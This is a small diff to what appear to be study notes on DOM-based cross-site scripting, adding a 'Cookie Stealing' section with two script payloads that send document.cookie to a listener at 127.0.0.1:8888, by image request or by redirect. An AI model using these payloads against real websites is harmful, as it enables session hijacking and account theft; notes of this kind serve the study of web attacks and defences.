@@ -30,7 +30,9 @@ In DOM XSS, the page itself (the HTTP response that is) does not change.
 
 [payload] -injected-> [ js code ] -executes-> [ creates object including payload] -renders-
 
-# Sink
+## Cookie Stealing
+<script>document.write('<img src="http://127.0.0.1:8888/?'+document.cookie+'">');</script>
+<script>window.location='http://127.0.0.1:8888/?cookie='+document.cookie</script>
 
 
 
